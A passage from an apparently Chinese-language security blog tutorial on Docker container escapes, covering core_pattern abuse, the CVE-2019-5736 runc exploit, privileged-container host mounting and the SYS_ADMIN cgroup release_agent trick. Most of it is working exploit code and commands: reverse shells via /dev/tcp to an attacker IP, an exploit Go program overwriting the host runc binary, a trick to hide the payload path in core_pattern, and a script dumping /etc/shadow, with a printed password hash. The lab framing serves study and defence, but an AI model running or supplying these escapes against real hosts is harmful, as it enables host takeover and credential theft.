class="string">&#x27;/tmp/.x.py&#x27;</span>)</span><br><span class="line">    s.close()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>

<p>==给python脚本添加权限：chmod 777 /tmp/.x.py==</p>
</li>
<li><p>攻击机监听</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvvp <span class="number">4444</span></span><br></pre></td></tr></table></figure></li>
<li><p>靶机执行最终payload</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">echo -e <span class="string">&quot;|/var/lib/docker/overlay2/a8c0d9490cd90b318c19ff03fd9d1d566bd234ebcb4554b3e58f5aaef1a16206/merged/tmp/.x.py core&quot;</span> &gt; <span class="regexp">/host_proc/</span>sys<span class="regexp">/kernel/</span>core_pattern</span><br></pre></td></tr></table></figure></li>
<li><p>触发payload</p>
<p>执行一个导致崩溃的程序</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> *a = <span class="literal">NULL</span>;</span><br><span class="line">    *a = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc a.c -o a</span><br><span class="line">./a</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ed4a9a47d52f:/tmp<span class="comment"># ./a</span></span><br><span class="line">Segmentation fault (core dumped)</span><br></pre></td></tr></table></figure>

<p>就会触发执行, 攻击机收到反弹的shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># nc -lvvp 4444</span></span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::4444</span><br><span class="line">Ncat: Listening on 0.0.0.0:4444</span><br><span class="line">Ncat: Connection from 172.16.42.151.</span><br><span class="line">Ncat: Connection from 172.16.42.151:37356.</span><br><span class="line">root@vuln:/<span class="comment">#</span></span><br></pre></td></tr></table></figure></li>
<li><p>payload优化</p>
<p>为了隐藏我们的payload，我们做一些修改</p>
<p>当前：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ed4a9a47d52f:/tmp<span class="comment"># cat /host_proc/sys/kernel/core_pattern</span></span><br><span class="line">|/var/lib/docker/overlay2/a8c0d9490cd90b318c19ff03fd9d1d566bd234ebcb4554b3e58f5aaef1a16206/merged/tmp/.x.py core</span><br></pre></td></tr></table></figure>

<p>由于core_pattern固定字节长度我们可以用/r来覆盖真实的地址</p>
<p>加入几个空格后的payload:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;|/var/lib/docker/overlay2/a8c0d9490cd90b318c19ff03fd9d1d566bd234ebcb4554b3e58f5aaef1a16206/merged/tmp/.x.py \rcore         &quot;</span> &gt; /host_proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure>

<p>达到混淆的效果:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ed4a9a47d52f:/tmp<span class="comment"># cat /host_proc/sys/kernel/core_pattern</span></span><br><span class="line">core         ker/overlay2/a8c0d9490cd90b318c19ff03fd9d1d566bd234ebcb4554b3e58f5aaef1a16206/merged/tmp/.x.p</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="3-利用程序漏洞进行逃逸"><a href="#3-利用程序漏洞进行逃逸" class="headerlink" title="3. 利用程序漏洞进行逃逸"></a>3. 利用程序漏洞进行逃逸</h2><p>我们可以利用容器生态中相关服务端、客户端程序自身存在漏洞进行逃逸</p>
<h3 id="3-1-容器运行时"><a href="#3-1-容器运行时" class="headerlink" title="3.1 容器运行时"></a>3.1 容器运行时</h3><p>容器运行时负责管理容器运行的整个生命周期，包括但不限于指定容器镜像格式、构建镜像、上传和拉去镜像、管理镜像、管理容器实例、运行容器等。在容器运行早期，Docker作为容器运行时的标准被广泛使用，而后由google、CoreOS、Docker等公司在2015年联合创建了开放容器标准（Open Container Initiative， OCI）,用于推进容器标准化，其主要包含两个标准，分别为容器运行时标准和容器镜像标准，OCI的容器运行时主要包括runC、Rocket、Kata Containers、gVisor等。再后来随着容器编排技术的发展，Kubernetes推出了容器运行时接口(Container Runtime Interface, CRI)，用于与容器运行时进行通讯，从而操作容器化程序。</p>
<h3 id="3-2-runC"><a href="#3-2-runC" class="headerlink" title="3.2 runC"></a>3.2 runC</h3><p>runC是一个遵循OCI标准的用来运行容器的命令行工具(CLI Tool)，它也是一个Runtime的实现</p>
<p>当我们执行docker info的时候，就可以看见如下内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ docker info</span><br><span class="line">......</span><br><span class="line"> Runtimes: io.containerd.runc.v2 io.containerd.runtime.v1.linux runc</span><br><span class="line"> Default Runtime: runc</span><br><span class="line"> ......</span><br></pre></td></tr></table></figure>

<p><code>runC</code>不仅可以被<code>docker engine</code>使用，它也可以单独使用(它本身就是命令行工具)。</p>
<h3 id="3-3-CVE-2019-5736-runc容器逃逸漏洞"><a href="#3-3-CVE-2019-5736-runc容器逃逸漏洞" class="headerlink" title="3.3 CVE-2019-5736 runc容器逃逸漏洞"></a>3.3 CVE-2019-5736 runc容器逃逸漏洞</h3><p><strong>影响版本：</strong></p>
<p>Docker  &lt; 18.09.2</p>
<p>runC &lt;= 1.0-rc6</p>
<p><strong>环境搭建：</strong></p>
<p>使用<a href="https://github.com/Metarget/metarget/blob/master/README-zh.md">metarget</a>搭建环境(注：要在ubuntu下使用)</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo</span> ./metarget cnv install cve-<span class="number">2019</span>-<span class="number">5736</span></span><br></pre></td></tr></table></figure>

<p>安装好后我们查看docker和runC版本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shadowflow@ubuntu:~/metarget$ docker version</span><br><span class="line">Client:</span><br><span class="line"> Version:      18.03.1-ce</span><br><span class="line"> API version:  1.37</span><br><span class="line"> Go version:   go1.9.5</span><br><span class="line"> Git commit:   9ee9f40</span><br><span class="line"> Built:        Wed Jun 20 21:43:51 2018</span><br><span class="line"> OS/Arch:      linux/amd64</span><br><span class="line"></span><br><span class="line">shadowflow@ubuntu:~/metarget$ docker-runc --version</span><br><span class="line">runc version 1.0.0-rc5</span><br><span class="line">commit: 4fc53a81fb7c994640722ac585fa9ca548971871</span><br><span class="line">spec: 1.0.0</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>下载<a href="https://github.com/Frichetten/CVE-2019-5736-PoC">poc</a>，修改payload为反弹shell。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">// Implementation of CVE-2019-5736</span></span><br><span class="line"><span class="comment">// Created with help from @singe, @_cablethief, and @feexd.</span></span><br><span class="line"><span class="comment">// This commit also helped a ton to understand the vuln</span></span><br><span class="line"><span class="comment">// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d</span></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;strconv&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// This is the line of shell commands that will execute on the host</span></span><br><span class="line"><span class="comment">//var payload = &quot;#!/bin/bash \n cat /etc/shadow &gt; /tmp/shadow &amp;&amp; chmod 777 /tmp/shadow&quot;</span></span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">&quot;#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/172.16.42.100/4444 0&gt;&amp;1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// First we overwrite /bin/sh with the /proc/self/exe interpreter path</span></span><br><span class="line">	fd, err := os.Create(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Fprintln(fd, <span class="string">&quot;#!/proc/self/exe&quot;</span>)</span><br><span class="line">	err = fd.Close()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;[+] Overwritten /bin/sh successfully&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Loop through all processes to find one whose cmdline includes runcinit</span></span><br><span class="line">	<span class="comment">// This will be the process created by runc</span></span><br><span class="line">	<span class="keyword">var</span> found <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">for</span> found == <span class="number">0</span> &#123;</span><br><span class="line">		pids, err := ioutil.ReadDir(<span class="string">&quot;/proc&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			fmt.Println(err)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> _, f := <span class="keyword">range</span> pids &#123;</span><br><span class="line">			fbytes, _ := ioutil.ReadFile(<span class="string">&quot;/proc/&quot;</span> + f.Name() + <span class="string">&quot;/cmdline&quot;</span>)</span><br><span class="line">			fstring := <span class="keyword">string</span>(fbytes)</span><br><span class="line">			<span class="keyword">if</span> strings.Contains(fstring, <span class="string">&quot;runc&quot;</span>) &#123;</span><br><span class="line">				fmt.Println(<span class="string">&quot;[+] Found the PID:&quot;</span>, f.Name())</span><br><span class="line">				found, err = strconv.Atoi(f.Name())</span><br><span class="line">				<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">					fmt.Println(err)</span><br><span class="line">					<span class="keyword">return</span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// We will use the pid to get a file handle for runc on the host.</span></span><br><span class="line">	<span class="keyword">var</span> handleFd = <span class="number">-1</span></span><br><span class="line">	<span class="keyword">for</span> handleFd == <span class="number">-1</span> &#123;</span><br><span class="line">		<span class="comment">// Note, you do not need to use the O_PATH flag for the exploit to work.</span></span><br><span class="line">		handle, _ := os.OpenFile(<span class="string">&quot;/proc/&quot;</span>+strconv.Itoa(found)+<span class="string">&quot;/exe&quot;</span>, os.O_RDONLY, <span class="number">0777</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">int</span>(handle.Fd()) &gt; <span class="number">0</span> &#123;</span><br><span class="line">			handleFd = <span class="keyword">int</span>(handle.Fd())</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;[+] Successfully got the file handle&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Now that we have the file handle, lets write to the runc binary and overwrite it</span></span><br><span class="line">	<span class="comment">// It will maintain it&#x27;s executable flag</span></span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		writeHandle, _ := os.OpenFile(<span class="string">&quot;/proc/self/fd/&quot;</span>+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, <span class="number">0700</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">int</span>(writeHandle.Fd()) &gt; <span class="number">0</span> &#123;</span><br><span class="line">			fmt.Println(<span class="string">&quot;[+] Successfully got write handle&quot;</span>, writeHandle)</span><br><span class="line">			writeHandle.Write([]<span class="keyword">byte</span>(payload))</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译poc:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</span><br></pre></td></tr></table></figure>

<p><strong>启动一个容器：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo docker run -it --name debian --rm debian /bin/bash</span><br></pre></td></tr></table></figure>

<p><strong>将poc复制到容器内并运行：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker cp main debian:/main</span><br><span class="line"></span><br><span class="line"><span class="comment">#容器内运行</span></span><br><span class="line">/main</span><br></pre></td></tr></table></figure>

<p><strong>启动监听：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure>

<p><strong>模拟宿主机进入容器：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it debian /bin/sh</span><br></pre></td></tr></table></figure>

<p><em>注：这里我进入的时候第一次用/bin/sh，才行，后面用/bin/bash也可以</em></p>
<p><strong>结果：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># nc -lvvp 4444</span></span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::4444</span><br><span class="line">Ncat: Listening on 0.0.0.0:4444</span><br><span class="line">Ncat: Connection from 172.16.42.181.</span><br><span class="line">Ncat: Connection from 172.16.42.181:53510.</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (1212): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">root@ubuntu:/<span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>



<h3 id="3-4-总结"><a href="#3-4-总结" class="headerlink" title="3.4 总结"></a>3.4 总结</h3><p>这个漏洞虽然可以逃逸，但是利用难度也是挺大的，需要宿主机用户进入容器才能触发。还有一些其他的动态连接库利用以及条件竞争产生的符号链接替换也可以用来逃逸，比如：CVE-2018-15664:符号链接替换漏洞，CVE-2019-14271:加载不受信任的动态链接。但是利用难度更大，实际使用效果不佳，这里不做说明。</p>
<h2 id="4-通过Capabilities进行逃逸"><a href="#4-通过Capabilities进行逃逸" class="headerlink" title="4. 通过Capabilities进行逃逸"></a>4. 通过Capabilities进行逃逸</h2><h3 id="4-1-理解linux-Capabilities"><a href="#4-1-理解linux-Capabilities" class="headerlink" title="4.1 理解linux Capabilities"></a>4.1 理解linux Capabilities</h3><p>Linux内核中的Capabilities特性用于划分特权集，以便进程可以只分配“执行特定功能”的特权。<br> 在引入此特性前，如果进程需要使用网络，则必须使用root来运行，通常是sudo或者添加suid，那么普通用户在使用ping时，ping就可以运行任何特权。引入Capabilities特性后，可以通过给ping应用添加CAP_NET_RAW特权集，使其具有使用网络的特权集，而不具备其他特权集。缺省ping具有cap_net_admin和cap_net_raw特权集</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ <span class="built_in">getcap</span> /bin/ping</span><br><span class="line">/bin/ping = cap_net_raw+ep</span><br></pre></td></tr></table></figure>

<p>在 Linux 中的 Capabilities 是通过 extended attributes 中的 security 命名空间实现的,selinux也是一样</p>
<p>可以通过查看进程/proc/xxxx/status，来检查进程的特权集，并通过capsh来解码得到具体的特权集。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ ps -ef | grep dockerd | grep -v grep</span><br><span class="line">root        466      1  0 02:01 ?        00:00:14 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock</span><br><span class="line">➜  ~ cat /proc/466/status | grep Cap</span><br><span class="line">CapInh:	0000000000000000</span><br><span class="line">CapPrm:	0000003fffffffff</span><br><span class="line">CapEff:	0000003fffffffff</span><br><span class="line">CapBnd:	0000003fffffffff</span><br><span class="line">CapAmb:	0000000000000000</span><br></pre></td></tr></table></figure>

<p>使用capsh可以翻译出每个BIT的含义，3=0011表示2个bit，f=1111表示4个bit，一共2+4+4+4+4+4+4+4+4+4=38bit，从后先前，每个bit代表一种特权，一共38种特权集.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ capsh --decode=0000003fffffffff</span><br><span class="line">0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read</span><br></pre></td></tr></table></figure>



<h3 id="4-2-Docker中的Capabilities"><a href="#4-2-Docker中的Capabilities" class="headerlink" title="4.2 Docker中的Capabilities"></a>4.2 Docker中的Capabilities</h3><p>Docker 也支持 Capabilities ,在运行容器的时候可以通过指定 –privileded 参数来开启容器的所有CAP，可以通过–cap-add 和 –cap-drop 这两个参数来调整.</p>
<ul>
<li><p>使用–privileged可以获得所有特权集</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ docker run --name test-privileged -td --privileged  busybox  /bin/httpd -f</span><br><span class="line">22f11286c7689741930816751d57b69038bcabe1fe2f9a0a62d8c1c58aa1898c</span><br><span class="line">➜  ~ ps -ef | grep httpd</span><br><span class="line">root       4733   4711  0 16:38 pts/0    00:00:00 /bin/httpd -f</span><br><span class="line">root       4799   4120  0 16:38 pts/0    00:00:00 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn --exclude-dir=.idea --exclude-dir=.tox httpd</span><br><span class="line">➜  ~ cat /proc/4733/status | grep -i <span class="built_in">cap</span></span><br><span class="line">CapInh:	0000003fffffffff</span><br><span class="line">CapPrm:	0000003fffffffff</span><br><span class="line">CapEff:	0000003fffffffff</span><br><span class="line">CapBnd:	0000003fffffffff</span><br><span class="line">CapAmb:	0000000000000000</span><br></pre></td></tr></table></figure></li>
<li><p>使用–cap-add=ALL也可以获得所有特权集</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ docker run --name test-all -td --cap-add=ALL busybox /bin/httpd -f</span><br><span class="line">2a2d0f9fcf2012c59b1493060b42b0d164f448e07d5b9229f7973db081fd289f</span><br><span class="line">➜  ~ ps -ef | grep httpd | grep -v grep</span><br><span class="line">root       5277   5256  0 16:42 pts/0    00:00:00 /bin/httpd -f</span><br><span class="line">➜  ~ cat /proc/5277/status | grep -i <span class="built_in">cap</span></span><br><span class="line">CapInh:	0000003fffffffff</span><br><span class="line">CapPrm:	0000003fffffffff</span><br><span class="line">CapEff:	0000003fffffffff</span><br><span class="line">CapBnd:	0000003fffffffff</span><br><span class="line">CapAmb:	0000000000000000</span><br></pre></td></tr></table></figure></li>
<li><p>拥有 SYS_ADMIN 权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ docker run --name <span class="built_in">test</span> -td --cap-add=SYS_ADMIN busybox /bin/httpd -f</span><br><span class="line">12e311138f8638f602712e3abe9e42cbb4bfc5de39d14803c2c88893b8905bc7</span><br><span class="line">➜  ~ ps -ef | grep httpd | grep -v grep</span><br><span class="line">root       5561   5540  0 16:48 pts/0    00:00:00 /bin/httpd -f</span><br><span class="line">➜  ~ cat /proc/5561/status | grep -i <span class="built_in">cap</span></span><br><span class="line">CapInh:	00000000a82425fb</span><br><span class="line">CapPrm:	00000000a82425fb</span><br><span class="line">CapEff:	00000000a82425fb</span><br><span class="line">CapBnd:	00000000a82425fb</span><br><span class="line">CapAmb:	0000000000000000</span><br><span class="line">➜  ~ docker run --name test-privileged -td --privileged  busybox  /bin/httpd -f</span><br><span class="line">➜  ~ capsh --decode=00000000a82425fb</span><br><span class="line">0x00000000a82425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_admin,cap_mknod,cap_audit_write,cap_setfcap</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="4-3-–privileged特权进行逃逸"><a href="#4-3-–privileged特权进行逃逸" class="headerlink" title="4.3 –privileged特权进行逃逸"></a>4.3 –privileged特权进行逃逸</h3><p>在特权容器里，你可以把宿主机里的根目录 / 挂载到容器内部，从而去操作宿主机内的任意文件，例如 crontab config file, /root/.ssh/authorized_keys, /root/.bashrc 等文件，而达到逃逸的目的。</p>
<ol>
<li><p>启动一个特权容器环境</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">run</span> -<span class="keyword">it</span> <span class="comment">--rm --privileged ubuntu /bin/bash</span></span><br></pre></td></tr></table></figure></li>
<li><p>判断挂载的磁盘</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">fdisk -l #查看逻辑磁盘看不到切换到<span class="regexp">/dev目录通过fdisk -l /</span>dev/dm-<span class="number">0</span>判断</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@bf0b7fcd75d1:/<span class="comment"># fdisk -l</span></span><br><span class="line">Disk /dev/sda: 41 GiB, 44023414784 bytes, 85983232 sectors</span><br><span class="line">Disk model: VMware Virtual S</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disklabel <span class="built_in">type</span>: dos</span><br><span class="line">Disk identifier: 0x15ec275c</span><br><span class="line"></span><br><span class="line">Device     Boot    Start      End  Sectors  Size Id Type</span><br><span class="line">/dev/sda1  *        2048 83982335 83980288   40G 83 Linux</span><br><span class="line">/dev/sda2       83984382 85981183  1996802  975M  5 Extended</span><br><span class="line">/dev/sda5       83984384 85981183  1996800  975M 82 Linux swap / Solaris</span><br></pre></td></tr></table></figure>

<p>这里很轻易可以判断出是/dev/sda1</p>
</li>
<li><p>容器内创建挂载的目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir /shadowtest</span><br></pre></td></tr></table></figure></li>
<li><p>将宿主机目录挂载到容器内目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mount /dev/sda1 /shadowtest</span><br></pre></td></tr></table></figure></li>
<li><p>切换到挂载的宿主机目录</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">chroot <span class="string">/shadowtest</span></span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@bf0b7fcd75d1:/<span class="comment"># chroot /shadowtest</span></span><br><span class="line"><span class="comment"># cat /etc/passwd | grep shadowflow</span></span><br><span class="line">shadowflow:x:1000:1000:shadowflow,,,:/home/shadowflow:/bin/bash</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure></li>
<li><p>通过反弹shell或者定时任务写入ssh key等方式进行利用</p>
<p>这里我们反弹shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/bin/bash -c <span class="string">&quot;/bin/bash -i &gt;&amp; /dev/tcp/172.16.42.100/4444 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># nc -lvvp 4444</span></span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::4444</span><br><span class="line">Ncat: Listening on 0.0.0.0:4444</span><br><span class="line">Ncat: Connection from 172.16.42.151.</span><br><span class="line">Ncat: Connection from 172.16.42.151:44584.</span><br><span class="line">root@bf0b7fcd75d1:/<span class="comment">#</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="4-4-通过SYS-ADMIN逃逸"><a href="#4-4-通过SYS-ADMIN逃逸" class="headerlink" title="4.4 通过SYS_ADMIN逃逸"></a>4.4 通过SYS_ADMIN逃逸</h3><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">--cap-add</span>=SYS_ADMIN  启动时，允许执行mount特权操作，需获得资源挂载进行利用。</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/neargle/cloud_native_security_test_case/blob/master/privileged/1-host-ps.sh">poc</a>: release_agent.sh</p>
<p>修改为<code>cat /etc/shadow</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> -uex</span><br><span class="line"></span><br><span class="line">mkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o memory cgroup /tmp/cgrp &amp;&amp; mkdir /tmp/cgrp/x</span><br><span class="line"> </span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /tmp/cgrp/x/notify_on_release</span><br><span class="line">host_path=`sed -n <span class="string">&#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27;</span> /etc/mtab`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$host_path</span>/cmd&quot;</span> &gt; /tmp/cgrp/release_agent</span><br><span class="line"> </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;#!/bin/sh&#x27;</span> &gt; /cmd</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;cat /etc/shadow &gt; <span class="variable">$host_path</span>/output&quot;</span> &gt;&gt; /cmd</span><br><span class="line">chmod a+x /cmd</span><br><span class="line"> </span><br><span class="line">sh -c <span class="string">&quot;echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs&quot;</span></span><br><span class="line"></span><br><span class="line">sleep 2</span><br><span class="line">cat <span class="string">&quot;/output&quot;</span></span><br></pre></td></tr></table></figure>

<p>只要我们结果中可以看到宿主机的用户表示我们成功逃逸</p>
<p><strong>漏洞利用成功有如下前提：</strong></p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">在容器内root用户</span><br><span class="line">容器必须使用SYS_ADMIN Linux capability运行</span><br><span class="line">容器必须缺少AppArmor配置文件，否则将允许mount <span class="keyword">syscall</span></span><br><span class="line"><span class="keyword"></span>cgroup <span class="built_in">v1</span>虚拟文件系统必须以读写方式安装在容器内部</span><br></pre></td></tr></table></figure>

<p>启动漏洞环境：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --name <span class="built_in">test</span> -itd --cap-add=SYS_ADMIN --security-opt apparmor=unconfined --rm debian /bin/bash</span><br></pre></td></tr></table></figure>

<p>将poc导入到容器：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker cp release_agent.sh <span class="built_in">test</span>:/root/</span><br></pre></td></tr></table></figure>

<p>进入容器执行：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">docker exec -it test <span class="regexp">/bin/</span>bash</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@826a9c2d8457:/<span class="comment"># bash /root/release_agent.sh</span></span><br><span class="line">......</span><br><span class="line">hplip:*:18848:0:99999:7:::</span><br><span class="line">shadowflow:$6$oAwaNvbnhpdcJooQ<span class="variable">$Ng3O0KGA9</span>/TZghLbmPXGWBS1UDaPH9fqgxAhemNwmq9GA2rnfeJNQ68wrf2XcNQBWC3QEhHNz.e9WrzjOst6d0:18848:0:99999:7:::</span><br><span class="line">systemd-coredump:!!:18848::::::</span><br></pre></td></tr></table></figure>



<h3 id="4-5-通过SYS-PTRACE逃逸"><a href="#4-5-通过SYS-PTRACE逃逸" class="headerlink" title="4.5 通过SYS_PTRACE逃逸"></a>4.5 通过SYS_PTRACE逃逸</h3><p>攻击机器：172.16.42.100</p>
<p>靶机：172.16.42.151</p>
<p>带有SYS_PTRACE权限的容器还是挺多的，对于开发来说可能需要SYS_PTRACE权限进行调试</p>
<p>靶机启动带宿主机进程和CAP_SYS_PTRACE特权的容器</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">docker <span class="builtin-name">run</span> --name test -itd <span class="attribute">--cap-add</span>=SYS_PTRACE <span class="attribute">--pid</span>=host --security-opt <span class="attribute">apparmor</span>=unconfined --rm ubuntu</span><br></pre></td></tr></table></figure>

<p><strong>利用成功前提：</strong></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="attribute">--cap-add</span>=SYS_PTRACE</span><br><span class="line"><span class="attribute">--pid</span>=host</span><br><span class="line">--security-opt <span class="attribute">apparmor</span>=unconfined</span><br></pre></td></tr></table></figure>



